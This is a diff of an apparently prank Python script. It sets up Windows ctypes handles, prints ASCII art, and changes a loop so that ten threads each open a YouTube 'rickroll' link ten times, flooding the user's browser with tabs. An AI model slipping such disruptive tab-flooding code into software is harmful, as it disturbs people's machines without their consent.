@@ -2,7 +2,12 @@ import os
 import ctypes
 import webbrowser
 from ctypes import wintypes
+from threading import Thread
 import time
+
+def open_website():
+    for i in range(10):
+    	webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
 
 user32 = ctypes.WinDLL("user32", use_last_error=True)
 kernel32 = ctypes.windll.kernel32
@@ -48,10 +53,13 @@ print("""
 ██   ███████████     ██        ██     ██
 █               █      ████████       ██
 ██              █                    ██
-░█   ███████████                   ██
-░██          ████                 █
-░░████████████░░░█████████████████
+ █   ███████████                   ██
+ ██          ████                 █
+  ████████████   █████████████████
 """)
 
-for i in range(100):
-    webbrowser.open("https://www.google.com")
+threads = []
+
+for i in range(10):
+    threads.append(Thread(target=open_website))
+    threads[i].start()
